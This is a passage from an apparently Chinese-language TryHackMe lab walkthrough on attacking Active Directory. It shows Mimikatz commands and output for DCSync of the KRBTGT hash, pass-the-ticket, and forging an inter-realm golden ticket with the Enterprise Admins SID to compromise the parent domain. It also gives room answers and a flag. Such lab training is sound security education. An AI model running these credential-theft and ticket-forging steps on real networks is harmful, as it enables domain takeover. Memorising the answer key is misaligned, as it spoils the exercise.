class="token-line" style="color:#393A34"><span class="token plain"> &#x27;## v ##&#x27;       Vincent LE TOUX             (vincent.letoux@gmail.com)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # privilege::debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Privilege &#x27;20&#x27; OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # kerberos::ptt administrator.kirbi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* File: &#x27;administrator.kirbi&#x27;: OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # exit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Bye!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Tools&gt;dir \\THMDC.za.tryhackme.loc\c$\</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Volume Serial Number is 1634-22A9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Directory of \\THMDC.za.tryhackme.loc\c$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">01/04/2022  08:47 AM               103 delete-vagrant-user.ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/30/2022  10:24 AM               154 dns_entries.csv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/27/2022  10:53 PM           885,468 MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">09/15/2018  08:19 AM    &lt;DIR&gt;          PerfLogs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">03/21/2020  09:31 PM    &lt;DIR&gt;          Program Files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">03/21/2020  09:28 PM    &lt;DIR&gt;          Program Files (x86)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/25/2022  07:13 PM    &lt;DIR&gt;          tmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/27/2022  08:22 AM    &lt;DIR&gt;          Users</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/25/2022  07:11 PM    &lt;SYMLINKD&gt;     vagrant [\\vboxsvr\vagrant]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/27/2022  08:12 PM    &lt;DIR&gt;          Windows</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               7 File(s)      2,356,811 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               7 Dir(s)  50,914,541,568 bytes free</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>最终，我们已经获得了零级基础设施的访问权限，并且成功入侵了整个子域！</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>用户创建什么来向 CA 请求证书？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Certificate signing request</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>微软的 PKI 实现名称是什么？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Active Directory Certificate Services</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>存储在管理员桌面目录 THMDC 上的标志的值是多少 (flag5.txt)？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{AD.Certs.Can.Get.You.DA}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploiting-domain-trusts---利用域信任">Exploiting Domain Trusts - 利用域信任<a href="#exploiting-domain-trusts---利用域信任" class="hash-link" aria-label="Exploiting Domain Trusts - 利用域信任的直接链接" title="Exploiting Domain Trusts - 利用域信任的直接链接">​</a></h2>
<p>虽然我们已经访问了 Tier 0 设施，但这还不够。我们只是利用了 ZA.TRYHACKME.LOC 域。肯定 TRYHACKME 还有其他地区的域，对吧？如果我们控制了根域 TRYHACKME.LOC，我们就能够控制所有这些地区域。在这个任务中，我们将看看如何利用域信任来控制整个林区。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="域信任">域信任<a href="#域信任" class="hash-link" aria-label="域信任的直接链接" title="域信任的直接链接">​</a></h3>
<p>正如在 AD 基础知识房间中讨论的那样，一个森林是 AD 网络中一个或多个域树的集合。域信任是网络中用户获取对其他资源访问权限的机制。在很大程度上，信任定义了森林内部域之间的通信方式。在某些环境中，信任可以延伸到外部域，甚至在某些情况下还可以延伸到其他森林。</p>
<p>在域之间可以配置两种主要类型的信任：</p>
<ul>
<li>方向性 - 信任的方向从一个信任域流向一个被信任域</li>
<li>可传递性 - 信任关系扩展到不仅仅是两个域，还包括其他被信任的域</li>
</ul>
<p>在一个森林中通常会有一个根或父域。在我们的情况下，这是 TRYHACKME.LOC。对于每个区域办公室，都会创建子域或子域，比如 ZA.TRYHACKME.LOC 或 UK.TRYHACKME.LOC。这种森林配置将允许 ZA 和 UK 办公室之间共享资源。例如，如果 UK 办 公室的某个用户需要访问 THMSERVER1，我们可以为 ZA 域中的用户授予访问权限。这种权限委派可以工作，因为 ZA 与根域以及 UK 与根域之间存在双向信任，从根本上创建了 ZA 和 UK 之间的可传递信任。</p>
<p>如上所述，父域和子域之间的信任是双向的。这是预期的行为，并且用于通过更大的可传递信任关系共享资源。然而，作为攻击者，如果我们已经攻击了子域，我们也可以利用这种信任来威胁到父域。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="krbtgt-和黄金票据">KRBTGT 和黄金票据<a href="#krbtgt-和黄金票据" class="hash-link" aria-label="KRBTGT 和黄金票据的直接链接" title="KRBTGT 和黄金票据的直接链接">​</a></h3>
<p>KRBTGT 是微软对 Kerberos 的实现所使用的账户。名称来源于 Kerberos（KRB）和 Ticket Granting Ticket（TGT）。实质上，这个账户充当 Kerberos Distribution Center（KDC）服务的服务账户，该服务处理所有 Kerberos 票证请求。这个账户用于为域中的所有 Kerberos 票证加密和签名。由于密码哈希由所有域控制器共享，因此它们可以验证用户请求访问资源时接收到的 TGT 的真实性。</p>
<p>然而，如果我们想要生成自己的 TGT 来授予我们对一切的访问权限怎么办？这就是所谓的 Golden Ticket 攻击。在 Golden Ticket 攻击中，我们完全绕过了 KDC，创建自己的 TGT，本质上成为了一个 Ticket Granting Server（TGS）。为了伪造 TGT，我们需要以下信息：</p>
<ul>
<li>域的 FQDN（完全限定域名）</li>
<li>域的安全标识符（SID）</li>
<li>我们想要冒充的账户用户名</li>
<li>KRBTGT 密码哈希</li>
</ul>
<p>前三个通常很容易恢复。最后一个需要域被威胁，因为 KRBTGT 密码哈希只存储在域控制器上。幸运的是，我们刚刚通过伪造证书攻击了 Tier 0 管理员组，所以我们有能力恢复 THMSERVER2 上的 KRBTGT 密码哈希。</p>
<p>我们将再次使用 Mimikatz 和 DC Sync 来恢复 THMSERVER2 上的 KRBTGT 密码哈希：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Command Prompt</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Tools&gt;mimikatz_trunk\x64\mimikatz.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;## v ##&#x27;       Vincent LE TOUX             (vincent.letoux@gmail.com)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # privilege::debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Privilege &#x27;20&#x27; OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # lsadump::dcsync /user:za\krbtgt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[DC] &#x27;za.tryhackme.loc&#x27; will be the domain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[DC] &#x27;THMDC.za.tryhackme.loc&#x27; will be the DC server</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[DC] &#x27;za\krbtgt&#x27; will be the user account</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[rpc] Service  : ldap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Object RDN           : krbtgt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">** SAM ACCOUNT **</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SAM Username         : krbtgt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Account Type         : 30000000 (USER_OBJECT)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User Account Control : 00000202 (ACCOUNTDISABLE NORMAL_ACCOUNT)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Account expiration   :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password last change : 4/25/2022 7:18:22 PM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Object Relative ID   : 502</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Credentials:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Hash NTLM: removed</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ntlm- 0: removed</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lm  - 0: removed</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[....]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="inter-realm-tgts---跨域-tgt">Inter-Realm TGTs - 跨域 TGT<a href="#inter-realm-tgts---跨域-tgt" class="hash-link" aria-label="Inter-Realm TGTs - 跨域 TGT的直接链接" title="Inter-Realm TGTs - 跨域 TGT的直接链接">​</a></h3>
<p>抓取 KRBTGT 密码哈希后，我们现在可以 伪造一个 Golden Ticket 来访问子域中的任何资源。这也将在 “持续 AD” 房间中进行更详细的讨论。然而，我们可以通过伪造一个 Inter-Realm TGT 来进一步操作。Inter-Realm TGT 用于提供对其他域中资源的访问权限。在我们的情况下，我们希望利用子域和父域之间的双向信任关系，以获取对父域的完全访问权限。</p>
<p>在构造 Golden Ticket 时，我们将包含来自其他域的额外账户 SID，以执行此漏洞利用。Mimikatz 可以帮助我们，在 Kerberos TGT 的 KERB_VALIDATION_INFO 结构的 ExtraSids 部分中设置 ExtraSids。ExtraSids 部分被描述为 “指向包含与主体所属账户域之外的域中组的 SID 列表的 KERB_SID_AND_ATTRIBUTES 结构列表的指针”。</p>
<p>关键在于，我们将通过在我们伪造的子域域控制器的票证中添加 Enterprise Admins（EA）组的 SID 作为额外 SID 来利用父域对我们子域的信任。EA 组属于父域，加入这个组基本上授予了对整个森林的管理权限！该组的默认 SID 是 <code>S-1-5-21-&lt;RootDomain&gt;-519</code> 。</p>
<p>在进行利用之前，我们首先需要恢复两个 SID：</p>
<ul>
<li>子域控制器（THMDC）的 SID，我们将在我们伪造的 TGT 中冒充</li>
<li>父域中 Enterprise Admins 的 SID，我们将作为伪造的 TGT 的额外 SID 添加</li>
</ul>
<p>要恢复这些 SID，我们可以使用 AD-RSAT Powershell 命令。我们可以使用以下命令恢复子域控制器的 SID：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Command Prompt</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\&gt; Get-ADComputer -Identity &quot;THMDC&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DistinguishedName : CN=THMDC,OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DNSHostName       : THMDC.za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enabled           : True</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name              : THMDC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ObjectClass       : computer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ObjectGUID        : bd651750-782b-4b09-93b4-b5987ec7311b</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SamAccountName    : THMDC$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SID               : S-1-5-21-3885271727-2693558621-2658995185-1001</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UserPrincipalName :</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们可以使用以下命令查询父域控制器来恢复 Enterprise Admins 组的 SID：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Command Prompt</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\&gt; Get-ADGroup -Identity &quot;Enterprise Admins&quot; -Server thmrootdc.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DistinguishedName : CN=Enterprise Admins,CN=Users,DC=tryhackme,DC=loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GroupCategory     : Security</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GroupScope        : Universal</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name              : Enterprise Admins</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ObjectClass       : group</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ObjectGUID        : a23ae384-16e8-44d5-9b36-8173c4e0e5de</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SamAccountName    : Enterprise Admins</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SID               : S-1-5-21-3330634377-removed-519</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="利用域信任">利用域信任<a href="#利用域信任" class="hash-link" aria-label="利用域信任的直接链接" title="利用域信任的直接链接">​</a></h3>
<p>我们最终拥有了创建伪造 TGT 所需的所有信息。我们将使用 Mimikatz 生成这个 Golden Ticket。命令会类似于这样：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Command Prompt</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Tools&gt;mimikatz_trunk\x64\mimikatz.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;## v ##&#x27;       Vincent LE TOUX             (vincent.letoux@gmail.com)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # privilege::debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Privilege &#x27;20&#x27; OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:&lt;Password hash of krbtgt user&gt; /sids:&lt;SID of Enterprise Admins group&gt; /ptt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User      : Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Domain    : za.tryhackme.loc (ZA)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SID       : S-1-5-21-3885271727-2693558621-2658995185-1001</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User Id   : 500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Groups Id : *513 512 520 518 519</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Extra SIDs: S-1-5-21-3330634377-1326264276-632209373-519 ;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Service   : krbtgt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Lifetime  : 4/30/2022 7:52:51 PM ; 4/27/2032 7:52:51 PM ; 4/27/2032 7:52:51 PM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-&gt; Ticket : ** Pass The Ticket **</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * PAC generated</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * PAC signed</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * EncTicketPart generated</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * EncTicketPart encrypted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * KrbCred generated</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Golden ticket for &#x27;Administrator @ za.tryhackme.loc&#x27; successfully submitted for current session</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>首先，我们将验证该票证是否可用于访问 THMDC，因为它是子域管理员用户的有效票证：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Command Prompt</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt;dir \\thmdc.za.tryhackme.loc\c$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Volume in drive \\thmdc.za.tryhackme.loc\c$ is Windows</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Volume Serial Number is 1634-22A9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Directory of \\thmdc.za.tryhackme.loc\c$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">01/04/2022  08:47 AM               103 delete-vagrant-user.ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/30/2022  10:24 AM               154 dns_entries.csv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">09/15/2018  08:19 AM    &lt;DIR&gt;          PerfLogs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">03/21/2020  09:31 PM    &lt;DIR&gt;          Program Files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">03/21/2020  09:28 PM    &lt;DIR&gt;          Program Files (x86)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/25/2022  07:13 PM    &lt;DIR&gt;          tmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/27/2022  08:22 AM    &lt;DIR&gt;          Users</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/25/2022  07:11 PM    &lt;SYMLINKD&gt;     vagrant [\\vboxsvr\vagrant]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/27/2022  08:12 PM    &lt;DIR&gt;          Windows</span><br></span><span class="token-line" 